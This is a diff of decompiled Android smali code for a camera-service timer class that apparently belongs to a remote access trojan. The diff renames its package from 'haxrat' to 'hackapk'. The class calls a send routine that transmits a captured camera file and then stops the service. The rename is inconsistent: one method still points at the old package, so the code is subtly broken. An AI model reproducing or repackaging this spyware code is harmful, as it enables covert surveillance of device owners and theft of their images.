@@ -1,11 +1,11 @@
-.class Lcom/hax4us/haxrat/CamService$100000000;
+.class Lcom/justhack/hackapk/CamService$100000000;
 .super Ljava/util/TimerTask;
 .source "CamService.java"
 
 
 # annotations
 .annotation system Ldalvik/annotation/EnclosingClass;
-    value = Lcom/hax4us/haxrat/CamService;
+    value = Lcom/justhack/hackapk/CamService;
 .end annotation
 
 .annotation system Ldalvik/annotation/InnerClass;
@@ -15,11 +15,11 @@
 
 
 # instance fields
-.field private final this$0:Lcom/hax4us/haxrat/CamService;
+.field private final this$0:Lcom/justhack/hackapk/CamService;
 
 
 # direct methods
-.method constructor <init>(Lcom/hax4us/haxrat/CamService;)V
+.method constructor <init>(Lcom/justhack/hackapk/CamService;)V
     .locals 5
 
     move-object v0, p0
@@ -34,19 +34,19 @@
 
     move-object v4, v1
 
-    iput-object v4, v3, Lcom/hax4us/haxrat/CamService$100000000;->this$0:Lcom/hax4us/haxrat/CamService;
+    iput-object v4, v3, Lcom/justhack/hackapk/CamService$100000000;->this$0:Lcom/justhack/hackapk/CamService;
 
     return-void
 .end method
 
-.method static access$0(Lcom/hax4us/haxrat/CamService$100000000;)Lcom/hax4us/haxrat/CamService;
+.method static access$0(Lcom/hax4us/haxrat/CamService$100000000;)Lcom/justhack/hackapk/CamService;
     .locals 4
 
     move-object v0, p0
 
     move-object v3, v0
 
-    iget-object v3, v3, Lcom/hax4us/haxrat/CamService$100000000;->this$0:Lcom/hax4us/haxrat/CamService;
+    iget-object v3, v3, Lcom/hax4us/haxrat/CamService$100000000;->this$0:Lcom/justhack/hackapk/CamService;
 
     move-object v0, v3
 
@@ -72,22 +72,22 @@
 
     move-object v2, v0
 
-    iget-object v2, v2, Lcom/hax4us/haxrat/CamService$100000000;->this$0:Lcom/hax4us/haxrat/CamService;
+    iget-object v2, v2, Lcom/justhack/hackapk/CamService$100000000;->this$0:Lcom/justhack/hackapk/CamService;
 
-    invoke-static {v2}, Lcom/hax4us/haxrat/CamService;->access$1000012(Lcom/hax4us/haxrat/CamService;)V
+    invoke-static {v2}, Lcom/justhack/hackapk/CamService;->access$1000012(Lcom/justhack/hackapk/CamService;)V
 
     .line 159
     move-object v2, v0
 
-    iget-object v2, v2, Lcom/hax4us/haxrat/CamService$100000000;->this$0:Lcom/hax4us/haxrat/CamService;
+    iget-object v2, v2, Lcom/justhack/hackapk/CamService$100000000;->this$0:Lcom/justhack/hackapk/CamService;
 
-    iget-object v2, v2, Lcom/hax4us/haxrat/CamService;->cmd:Ljava/lang/String;
+    iget-object v2, v2, Lcom/justhack/hackapk/CamService;->cmd:Ljava/lang/String;
 
     move-object v3, v0
 
-    iget-object v3, v3, Lcom/hax4us/haxrat/CamService$100000000;->this$0:Lcom/hax4us/haxrat/CamService;
+    iget-object v3, v3, Lcom/justhack/hackapk/CamService$100000000;->this$0:Lcom/justhack/hackapk/CamService;
 
-    iget-object v3, v3, Lcom/hax4us/haxrat/CamService;->file:Ljava/io/File;
+    iget-object v3, v3, Lcom/justhack/hackapk/CamService;->file:Ljava/io/File;
 
     invoke-static {v2, v3}, Lcom/util/extras/Utils;->send(Ljava/lang/String;Ljava/io/File;)Z
 
@@ -96,9 +96,9 @@
     .line 160
     move-object v2, v0
 
-    iget-object v2, v2, Lcom/hax4us/haxrat/CamService$100000000;->this$0:Lcom/hax4us/haxrat/CamService;
+    iget-object v2, v2, Lcom/justhack/hackapk/CamService$100000000;->this$0:Lcom/justhack/hackapk/CamService;
 
-    invoke-virtual {v2}, Lcom/hax4us/haxrat/CamService;->stopSelf()V
+    invoke-virtual {v2}, Lcom/justhack/hackapk/CamService;->stopSelf()V
 
     .line 161
     const-string v2, "TAGG"
